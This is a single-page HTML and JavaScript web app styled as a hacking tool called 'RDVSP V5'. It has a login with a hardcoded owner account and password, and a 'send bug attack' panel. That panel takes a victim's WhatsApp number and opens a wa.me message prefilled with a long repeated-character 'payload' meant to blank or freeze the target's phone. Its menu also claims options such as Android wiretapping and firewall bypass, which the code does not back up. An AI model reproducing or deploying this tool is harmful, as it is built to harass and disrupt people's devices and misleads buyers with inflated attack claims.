<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>RDVSP V5 ‚Äî GHOST PROTOCOL</title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;900&display=swap');

*{box-sizing:border-box; -webkit-tap-highlight-color: transparent;}

body{
  margin:0; min-height:100vh; color:#00ffcc;
  font-family: 'Share Tech Mono', monospace;
  background: #000;
  display: flex; flex-direction: column; align-items: center; justify-content: center;
  overflow-x: hidden;
}

/* üì† SCANLINE EFFECT */
body::before {
  content: " "; display: block; position: fixed;
  top: 0; left: 0; bottom: 0; right: 0;
  background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
  z-index: 99999; background-size: 100% 2px, 3px 100%; pointer-events: none;
}

.bg-vfx { position: fixed; inset: 0; z-index: -1; background: radial-gradient(circle at center, #0a0a0a 0%, #000 100%); }
.bg-vfx::after {
    content: ""; position: absolute; inset: 0;
    background-image: linear-gradient(rgba(0, 255, 204, 0.05) 1px, transparent 1px), 
                      linear-gradient(90deg, rgba(0, 255, 204, 0.05) 1px, transparent 1px);
    background-size: 20px 20px;
}

/* üöÄ SCREENS */
#startScreen { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
#loading { position: fixed; inset: 0; background: #000; z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; }
.loader-ring { width: 70px; height: 70px; border: 2px solid #111; border-top: 2px solid #00ffcc; border-radius: 50%; animation: spin 0.5s linear infinite; box-shadow: 0 0 15px #00ffcc; }
@keyframes spin { to { transform: rotate(360deg); } }

/* üéûÔ∏è INTRO SECTION */
#introSection { width: 100%; max-width: 450px; padding: 20px; display: none; text-align: center; }
.intro-title { font-family: 'Orbitron'; font-size: 20px; color: #00ffcc; letter-spacing: 5px; margin-bottom: 20px; text-shadow: 0 0 10px #00ffcc; font-weight: 900; }
.cyber-frame { width: 100%; border-radius: 5px; overflow: hidden; border: 1px solid #00ffcc; box-shadow: 0 0 20px rgba(0, 255, 204, 0.2); position: relative; background: #000; }
.video-wrapper { position: relative; padding-bottom: 56.25%; height: 0; filter: grayscale(0.4) contrast(1.1); }
#introVideoPlayer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; }

.p-bar-bg { width: 100%; height: 4px; background: #111; margin-top: 25px; overflow: hidden; border: 1px solid #222; }
.p-bar-fill { width: 0%; height: 100%; background: #00ffcc; box-shadow: 0 0 10px #00ffcc; transition: width 0.3s; }
#percentText { color: #00ffcc; margin-top: 10px; font-size: 18px; letter-spacing: 3px; }

/* üë§ UI LOGOS & BADGES */
.cyber-logo { width: 120px; height: 120px; border-radius: 50%; border: 2px solid #00ffcc; margin-bottom: 15px; object-fit: cover; padding: 5px; background: #000; box-shadow: 0 0 20px rgba(0, 255, 204, 0.3); }
.logo-mini { width: 70px; height: 70px; border-radius: 50%; border: 1px solid #00ffcc; margin-bottom: 10px; object-fit: cover; }

.badge-container { display: flex; flex-direction: column; align-items: center; gap: 8px; margin: 15px 0; }
.badge-role, .badge-exp { border: 1px solid #00ffcc; background: rgba(0, 255, 204, 0.05); color: #00ffcc; padding: 8px 20px; width: 100%; font-size: 12px; display: flex; align-items: center; justify-content: center; gap: 10px; text-transform: uppercase; }

/* üçî SIDEBAR DASHBOARD */
#dashboard { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: #000; border-right: 1px solid #00ffcc; padding: 60px 20px; z-index: 1000; transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1); display: flex; flex-direction: column; }
#dashboard.active { left: 0; box-shadow: 10px 0 30px rgba(0,255,204,0.1); }
.menu-btn { position: fixed; top: 20px; left: 20px; font-size: 22px; color: #00ffcc; cursor: pointer; z-index: 1100; display: none; text-shadow: 0 0 10px #00ffcc; }
#overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; z-index: 900; }
#overlay.active { display: block; }

/* üì∫ MINI PLAYER INSIDE MENU & SIDEBAR */
.mini-intro-card { padding: 10px !important; margin-bottom: 0 !important; border-radius: 5px 5px 0 0; }
.mini-video-frame { width: 100%; height: 120px; border: 1px solid #00ffcc; overflow: hidden; background: #000; position: relative; }
.mini-video-frame video { width: 100%; height: 100%; object-fit: cover; opacity: 0.7; }
.mini-video-frame::after { content: "üî¥ LIVE_FEED"; position: absolute; top: 5px; left: 5px; font-size: 8px; color: #ff0055; animation: blink 1s infinite; }
@keyframes blink { 50% { opacity: 0; } }

/* üõ°Ô∏è UI CARDS */
#mainContainer { width: 100%; max-width: 400px; padding: 20px; display: none; }
.card { background: rgba(5, 5, 5, 0.95); border: 1px solid #00ffcc; padding: 25px; margin-bottom: 20px; position: relative; text-align: center; }
.card::before { content: "‚öôÔ∏è SYS_STATUS"; position: absolute; top: -10px; left: 10px; background: #000; padding: 0 10px; font-size: 10px; color: #00ffcc; }

input, select { width: 100%; padding: 12px; margin-bottom: 12px; background: #000; border: 1px solid #333; color: #00ffcc; font-family: 'Share Tech Mono'; outline: none; border-radius: 0; }
button { width: 100%; padding: 15px; border: 1px solid #00ffcc; background: rgba(0, 255, 204, 0.1); color: #00ffcc; font-weight: bold; cursor: pointer; text-transform: uppercase; font-family: 'Orbitron'; font-size: 11px; transition: 0.3s; }
button:hover { background: #00ffcc; color: #000; box-shadow: 0 0 20px #00ffcc; }
.logout { border: 1px solid #ff0055 !important; color: #ff0055 !important; background: transparent !important; margin-top: auto; }
.logout:hover { background: #ff0055 !important; color: #000 !important; }

.toast { background: #000; border: 1px solid #00ffcc; color: #00ffcc; padding: 12px 20px; font-size: 12px; border-left: 4px solid #00ffcc; }

.modal { position: fixed; inset: 0; background: rgba(0,0,0,0.95); display: none; align-items: center; justify-content: center; z-index: 2000; }
.modal-box { width: 90%; max-width: 380px; background: #000; padding: 25px; border: 1px solid #00ffcc; }
</style>
</head>
<body>

<div class="bg-vfx"></div>
<div id="toast-container" style="position: fixed; top: 20px; right: 20px; z-index: 3000; display: flex; flex-direction: column; gap: 8px;"></div>

<audio id="bgmIntro" src="https://assets.mixkit.co/music/preview/mixkit-tech-house-vibes-130.mp3" loop></audio>
<audio id="clickSound" src="https://www.soundjay.com/buttons/sounds/button-16.mp3"></audio>
<audio id="kluntingSound" src="https://assets.mixkit.co/sfx/preview/mixkit-software-interface-start-2574.mp3"></audio>
<audio id="failSound" src="https://www.soundjay.com/buttons/sounds/button-10.mp3"></audio>

<div id="startScreen">
    <img src="https://image2url.com/r2/bucket2/images/1766806737312-64f6a3a5-1922-4715-b34c-ec47ca8ccf3b.jpg" class="cyber-logo">
    <h1 style="letter-spacing:10px; font-family:'Orbitron'; font-weight:900;">RDVSP V5</h1>
    <p style="font-size:10px; margin-bottom:20px; color:#555;">üõ∞Ô∏è GHOST PROTOCOL INITIALIZED</p>
    <button onclick="startSystem()" style="width:200px;">RUN SISTEM INJEC ‚ö°</button>
</div>

<div id="loading">
    <div class="loader-ring"></div>
    <p style="margin-top:20px; letter-spacing:5px;">üëΩ BYPASSING_FIREWALL...</p>
</div>

<div id="introSection">
    <div class="intro-title">üìÄ RDVSP_V5.EXE</div>
    <div class="cyber-frame">
        <div class="video-wrapper">
            <video id="introVideoPlayer" playsinline>
                <source src="https://image2url.com/videos/1765801364379-5ff98c5a-4a06-4780-bb3c-e659c56080ac.mp4" type="video/mp4">
            </video>
        </div>
    </div>
    <div class="p-bar-bg"><div id="pBar" class="p-bar-fill"></div></div>
    <div id="percentText">0%</div>
</div>

<span id="menuBtn" class="menu-btn" onclick="toggleDash()">[ ‚ò∞ ]</span>
<div id="overlay" onclick="closeDash()"></div>
<div id="dashboard">
    <div style="text-align:center; margin-bottom:20px;">
        <img src="https://image2url.com/r2/bucket2/images/1766787962619-c6ecb17b-9a6e-4579-9f28-e02495f66527.jpg" class="logo-mini">
        <h3 style="color:#00ffcc; border-bottom:1px solid #333; padding-bottom:10px; font-size:14px; font-family:'Orbitron';">RDVSP V5</h3>
    </div>
    <div style="font-size: 12px; line-height: 2;">
        <p>üë§ USER: <span id="dashUser" style="color:#fff">--</span></p>
        <p>üõ°Ô∏è ROLE: <span id="dashRole" style="color:#00ffcc">--</span></p>
        <p>‚è≥ EXP: <span id="dashExp" style="color:yellow">--</span></p>
    </div>
    
    <div class="mini-video-frame" style="margin-top: 15px;">
        <video autoplay loop muted playsinline>
            <source src="https://image2url.com/videos/1765801364379-5ff98c5a-4a06-4780-bb3c-e659c56080ac.mp4" type="video/mp4">
        </video>
    </div>

    <button class="logout" onclick="location.reload()" style="margin-top: auto;">üö™ LOGOUT</button>
</div>

<div id="mainContainer">
    <div id="loginPage">
        <div class="card">
            <img src="https://image2url.com/r2/bucket2/images/1766806737312-64f6a3a5-1922-4715-b34c-ec47ca8ccf3b.jpg" style="width:80px; border-radius:50%; margin-bottom:15px; border:1px solid #00ffcc;">
            <h2 style="font-family:'Orbitron'; font-size:18px; margin-bottom:20px;">üîë LOGIN ID</h2>
            <input id="user" placeholder="üë§ USERNAME">
            <input id="pass" type="password" placeholder="üîë ACCESS KEY">
            <button onclick="loginBtn()">üîì LOGIN SYSTEM</button>
        </div>
    </div>

    <div id="app" style="display:none">
        <div class="card">
            <img src="https://image2url.com/r2/bucket2/images/1766806737312-64f6a3a5-1922-4715-b34c-ec47ca8ccf3b.jpg" style="width:80px; border-radius:50%; margin-bottom:15px; border:1px solid #00ffcc;">
            <h2 id="profileUser" style="margin:0; font-family:'Orbitron'; color:#00ffcc;"></h2>
            <div class="badge-container">
                <div class="badge-role">üëë Role: <span id="roleBadgeText">--</span></div>
                <div class="badge-exp">‚è≥ Exp: <span id="expBadgeText">--</span></div>
            </div>
        </div>

        <div class="card mini-intro-card">
            <div class="mini-video-frame">
                <video id="miniIntroVideo" loop muted playsinline>
                    <source src="https://image2url.com/videos/1765801364379-5ff98c5a-4a06-4780-bb3c-e659c56080ac.mp4" type="video/mp4">
                </video>
            </div>
        </div>

        <div class="card" style="border-top:none; border-radius:0 0 5px 5px;">
            <input id="target" placeholder="üéØ TARGET (62xxxxxxxxxx)">
            <select id="bug">
                <option value="ios">‚ö° BLANK IOS</option>
                <option value="android">üí• BLANK ANDROID</option>
                <option value="freeze">üßä FREEZE LOOP</option>
                <option value="sadap">ü™¨ SADAP ANDROID</option>
            </select>
            <button onclick="sendBugBtn()">üöÄ SEND BUG ATTACK üåê</button>
        </div>

        <div id="adminTools" style="display:none">
            <button onclick="openCreateUser()" style="margin-bottom:10px; border-color: orange; color: orange;">‚ûï CREATE USER</button>
            <button onclick="openAccountList()">üìÇ MANAGE AKUN</button>
        </div>
        <button class="logout" onclick="location.reload()">üîí LOGOUT AKUN</button>
    </div>
</div>

<div id="userModal" class="modal"><div class="modal-box">
    <h3>üìÇ PROVISION_NODE</h3>
    <input id="newUser" placeholder="Username">
    <input id="newPass" type="password" placeholder="Password">
    <select id="newRole"><option>USER</option><option>ADMIN</option><option>OWNER</option></select>
    <input id="newExp" type="date">
    <button onclick="saveUser()">SIMPAN ‚úÖ</button>
    <button class="logout" onclick="closeUserModal()" style="width:100%; margin-top:5px;">ABORT</button>
</div></div>

<div id="accountModal" class="modal"><div class="modal-box">
    <h3>üìú MASTER_LIST</h3>
    <div id="accountList" style="max-height:300px; overflow-y:auto;"></div>
    <button onclick="document.getElementById('accountModal').style.display='none'" style="margin-top:15px;">CLOSE</button>
</div></div>

<script>
const player = document.getElementById('introVideoPlayer');
const miniPlayer = document.getElementById('miniIntroVideo');
const bgm = document.getElementById('bgmIntro');
const clickSfx = document.getElementById('clickSound');
const kluntingSfx = document.getElementById('kluntingSound');
const failSfx = document.getElementById('failSound');

let accounts = JSON.parse(localStorage.getItem("accounts") || "[{\"user\":\"permenmin\",\"pass\":\"35357\",\"role\":\"OWNER\",\"exp\":\"2029-12-31\"}]");
let editIndex = -1;

function showNotify(msg, type = "success") {
    if(type === "success") { kluntingSfx.currentTime = 0; kluntingSfx.play().catch(()=>{}); } 
    else { failSfx.play().catch(()=>{}); }
    const container = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.style.borderLeftColor = type === "success" ? "#00ffcc" : "#ff0055";
    toast.innerHTML = `<span>${type === 'success' ? '‚úÖ' : '‚ùå'}</span> <span>${msg}</span>`;
    container.appendChild(toast);
    setTimeout(() => { toast.style.opacity="0"; setTimeout(()=>toast.remove(),400); }, 3000);
}

function startSystem() {
    clickSfx.play().catch(()=>{});
    document.getElementById('startScreen').style.display = "none";
    document.getElementById('loading').style.display = "flex";
    bgm.volume = 0.4; bgm.play().catch(()=>{});
    setTimeout(() => {
        document.getElementById('loading').style.display = "none";
        document.getElementById('introSection').style.display = "block";
        player.play().catch(()=>{});
    }, 2500);
}

player.ontimeupdate = () => { 
    const p = Math.floor((player.currentTime / player.duration) * 100) || 0;
    document.getElementById('pBar').style.width = p + "%";
    document.getElementById('percentText').innerText = p + "%";
};

player.onended = () => { 
    bgm.pause(); 
    document.getElementById('introSection').style.display = "none"; 
    document.getElementById('mainContainer').style.display = "block"; 
};

function loginBtn() {
    clickSfx.play().catch(()=>{});
    const u = document.getElementById('user').value, p = document.getElementById('pass').value;
    const found = accounts.find(a => a.user === u && a.pass === p);
    
    if(found) {
        const today = new Date().toISOString().split('T')[0];
        if (today > found.exp) { showNotify("EXPIRED", "error"); return; }
        
        showNotify("ACCESS GRANTED");
        document.getElementById('loginPage').style.display = "none";
        document.getElementById('app').style.display = "block";
        document.getElementById('menuBtn').style.display = "block";
        document.getElementById('profileUser').innerText = found.user.toUpperCase();
        document.getElementById('roleBadgeText').innerText = found.role;
        document.getElementById('expBadgeText').innerText = found.exp;
        document.getElementById('dashUser').innerText = found.user;
        document.getElementById('dashRole').innerText = found.role;
        document.getElementById('dashExp').innerText = found.exp;
        
        miniPlayer.play().catch(()=>{});

        if(found.role === "OWNER" || found.role === "ADMIN") document.getElementById('adminTools').style.display = "block";
    } else { 
        showNotify("DENIED", "error"); 
    }
}

function sendBugBtn() {
    const target = document.getElementById('target').value;
    if(!target) return showNotify("DATA TIDAK LENGKAP", "error");
    
    showNotify("ATTACK DISPATCHED COMPLETED ‚úÖ");
    const payload = "‚ö†Ô∏è *RDVSP V5 ATTACK* ‚ö†Ô∏è\n" + "Í¶ΩÍ¶ΩÍ¶Ω".repeat(1000);
    window.open(`https://wa.me/${target}?text=${encodeURIComponent(payload)}`, '_blank');
}

function openCreateUser(){ editIndex = -1; document.getElementById('userModal').style.display="flex"; }
function closeUserModal(){ document.getElementById('userModal').style.display="none"; }
function saveUser() {
    const u = document.getElementById('newUser').value, p = document.getElementById('newPass').value, r = document.getElementById('newRole').value, e = document.getElementById('newExp').value;
    if(!u || !p || !e) return showNotify("DATA_ERR", "error");
    if(editIndex === -1) { accounts.push({user:u, pass:p, role:r, exp:e}); }
    else { accounts[editIndex] = {user:u, pass:p, role:r, exp:e}; }
    localStorage.setItem("accounts", JSON.stringify(accounts));
    showNotify("DATABASE UPDATED");
    closeUserModal();
}

function openAccountList(){
    const list = document.getElementById('accountList');
    list.innerHTML = "";
    accounts.forEach((a, i) => {
        const isMain = a.user === "permenmin";
        list.innerHTML += `<div style="background:#050505; padding:10px; margin-bottom:8px; border:1px solid #00ffcc; font-size:11px;">
            <b>${a.user}</b> <span style="color:#00ffcc">[${a.role}]</span><br>EXP: ${a.exp}
            <div style="margin-top:8px; display:flex; gap:5px;">
                <button onclick="editUser(${i})" style="padding:4px 8px; font-size:10px; width:auto;">üìù EDIT</button>
                <button onclick="deleteAcc(${i})" style="padding:4px 8px; border-color:red; color:red; font-size:10px; width:auto; ${isMain ? 'display:none' : ''}">üóëÔ∏è DELETE</button>
            </div>
        </div>`;
    });
    document.getElementById('accountModal').style.display = "flex";
}

function editUser(i){
    editIndex = i; const acc = accounts[i];
    document.getElementById('newUser').value = acc.user;
    document.getElementById('newPass').value = acc.pass;
    document.getElementById('newRole').value = acc.role;
    document.getElementById('newExp').value = acc.exp;
    document.getElementById('accountModal').style.display = "none";
    document.getElementById('userModal').style.display = "flex";
}

function deleteAcc(i){
    if(accounts[i].user === "permenmin") return showNotify("LOCKED", "error");
    accounts.splice(i,1); localStorage.setItem("accounts", JSON.stringify(accounts)); openAccountList(); 
}

function toggleDash(){ document.getElementById('dashboard').classList.toggle("active"); document.getElementById('overlay').classList.toggle("active"); }
function closeDash(){ document.getElementById('dashboard').classList.remove("active"); document.getElementById('overlay').classList.remove("active"); }
</script>

</body>
</html>
